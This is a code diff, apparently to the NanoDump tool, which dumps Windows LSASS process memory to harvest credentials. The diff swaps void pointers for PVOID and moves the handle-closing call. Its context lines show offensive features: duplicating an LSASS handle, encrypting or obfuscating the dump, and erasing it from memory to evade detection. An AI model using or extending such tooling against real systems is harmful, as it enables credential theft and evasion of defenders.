@@ -11,17 +11,17 @@
 void writeat(
     struct dump_context* dc,
     ULONG32 rva,
-    const void* data,
+    const PVOID data,
     unsigned size
 )
 {
-    void* dst = (void*)((ULONG_PTR)dc->BaseAddress + rva);
+    PVOID dst = (PVOID)((ULONG_PTR)dc->BaseAddress + rva);
     MSVCRT$memcpy(dst, data, size);
 }
 
 void append(
     struct dump_context* dc,
-    const void* data,
+    const PVOID data,
     unsigned size
 )
 {
@@ -607,13 +607,13 @@ BOOL write_system_info_stream(
     struct MiniDumpSystemInfo system_info;
 
     // read the version and build numbers from the PEB
-    void* pPeb;
+    PVOID pPeb;
     ULONG32* OSMajorVersion;
     ULONG32* OSMinorVersion;
     USHORT* OSBuildNumber;
     ULONG32* OSPlatformId;
     UNICODE_STRING* CSDVersion;
-    pPeb = (void*)READ_MEMLOC(PEB_OFFSET);
+    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
 
 #if _WIN64
     OSMajorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x118);
@@ -1072,7 +1072,7 @@ struct module_info* write_module_list_stream(
 }
 
 void free_linked_list(
-    void* head
+    PVOID head
 )
 {
     if (head == NULL)
@@ -1711,7 +1711,7 @@ HANDLE duplicate_lsass_handle(
 }
 
 void encrypt_dump(
-    void* BaseAddress,
+    PVOID BaseAddress,
     ULONG32 Size
 )
 {
@@ -1857,6 +1857,9 @@ void go(char* args, int length)
 
     success = NanoDumpWriteDump(&dc);
 
+    // close the handle
+    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
+
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(dc.BaseAddress, dc.rva);
 
@@ -1881,9 +1884,6 @@ void go(char* args, int length)
     }
 
     erase_dump_from_memory(BaseAddress, RegionSize);
-
-    // close the handle
-    NtClose(hProcess); hProcess = NULL;
 
     if (success)
     {
@@ -2084,6 +2084,9 @@ int main(int argc, char* argv[])
 
     success = NanoDumpWriteDump(&dc);
 
+    // close the handle
+    NtClose(hProcess); hProcess = NULL; dc.hProcess = NULL;
+
     // at this point, you can encrypt or obfuscate the dump
     encrypt_dump(dc.BaseAddress, dc.rva);
 
@@ -2097,9 +2100,6 @@ int main(int argc, char* argv[])
     }
 
     erase_dump_from_memory(BaseAddress, RegionSize);
-
-    // close the handle
-    NtClose(hProcess); hProcess = NULL;
 
     if (success)
     {
